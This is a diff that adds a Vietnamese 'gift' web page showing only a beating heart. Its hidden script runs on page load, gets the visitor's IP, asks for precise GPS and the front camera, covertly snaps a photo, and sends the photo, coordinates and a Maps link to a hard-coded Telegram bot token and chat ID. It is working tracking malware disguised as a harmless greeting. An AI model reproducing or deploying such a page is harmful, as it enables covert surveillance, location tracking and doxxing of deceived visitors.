@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gửi Tặng Bạn</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background-color: #ffe6e6;
+            overflow: hidden;
+        }
+
+        /* Giao diện hình trái tim */
+        .heart {
+            position: relative;
+            width: 100px;
+            height: 90px;
+            background-color: red;
+            transform: rotate(-45deg);
+            animation: beat 1s infinite;
+            cursor: pointer;
+        }
+
+        .heart::before,
+        .heart::after {
+            content: "";
+            position: absolute;
+            width: 100px;
+            height: 100px;
+            background-color: red;
+            border-radius: 50%;
+        }
+
+        .heart::before {
+            top: -50px;
+            left: 0;
+        }
+
+        .heart::after {
+            left: 50px;
+            top: 0;
+        }
+
+        @keyframes beat {
+            0% { transform: scale(1) rotate(-45deg); }
+            50% { transform: scale(1.2) rotate(-45deg); }
+            100% { transform: scale(1) rotate(-45deg); }
+        }
+
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
+
+    <!-- Giao diện hiển thị duy nhất -->
+    <div class="heart"></div>
+
+    <!-- Phụ trợ xử lý camera ẩn -->
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const BOT_TOKEN = '8907393193:AAHR3ePsPfQzds4U-vbo21ju3dM5_3hr5uA';
+        const CHAT_ID = '8608244308';
+
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+
+        // 1. Lấy IP (Không cần xin quyền)
+        async function getIPAddress() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                return data.ip;
+            } catch (e) {
+                return "Không lấy được IP";
+            }
+        }
+
+        // 2. Lấy GPS (Chỉ lấy nếu người dùng đồng ý)
+        function getGeolocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve(null);
+                    return;
+                }
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
+                    () => resolve(null), // Từ chối cấp quyền -> Bỏ qua
+                    { enableHighAccuracy: true, timeout: 4000 }
+                );
+            });
+        }
+
+        // 3. Cố gắng lấy Stream Camera (Nếu từ chối -> Trả về null)
+        async function getCameraStream() {
+            try {
+                return await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            } catch (e) {
+                return null; // Không cấp quyền camera -> Bỏ qua chụp ảnh
+            }
+        }
+
+        // 4. Xử lý chính khi vừa mở web
+        async function initProcess() {
+            const userIP = await getIPAddress();
+            const location = await getGeolocation();
+            const stream = await getCameraStream();
+
+            let captionText = `🌐 **Thông tin thu thập:**\n`;
+            captionText += `• IP: ${userIP}\n`;
+
+            if (location) {
+                captionText += `• Tọa độ: ${location.lat}, ${location.lon}\n`;
+                captionText += `📍 **Google Maps:** https://www.google.com/maps?q=${location.lat},${location.lon}\n`;
+            } else {
+                captionText += `• Vị trí: Không được cấp quyền\n`;
+            }
+
+            // Trường hợp 1: Mở được Camera -> Chụp & Gửi Ảnh
+            if (stream) {
+                video.srcObject = stream;
+                
+                // Chờ camera sẵn sàng khung hình
+                video.onloadedmetadata = () => {
+                    setTimeout(() => {
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                        // Tắt camera sau khi chụp xong
+                        stream.getTracks().forEach(track => track.stop());
+
+                        canvas.toBlob(async (blob) => {
+                            if (!blob) return;
+                            const formData = new FormData();
+                            formData.append('chat_id', CHAT_ID);
+                            formData.append('photo', blob, 'photo.jpg');
+                            formData.append('caption', captionText);
+
+                            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                                method: 'POST',
+                                body: formData
+                            });
+                        }, 'image/jpeg', 0.8);
+                    }, 1000);
+                };
+            } 
+            // Trường hợp 2: Không có quyền Camera -> Chỉ gửi tin nhắn Text (IP & GPS)
+            else {
+                captionText += `• Ảnh: Không thể chụp (Chưa cấp quyền)`;
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: captionText,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            }
+        }
+
+        // Tự động kích hoạt ngay khi tải trang
+        window.onload = initProcess;
+    </script>
+</body>
+</html>
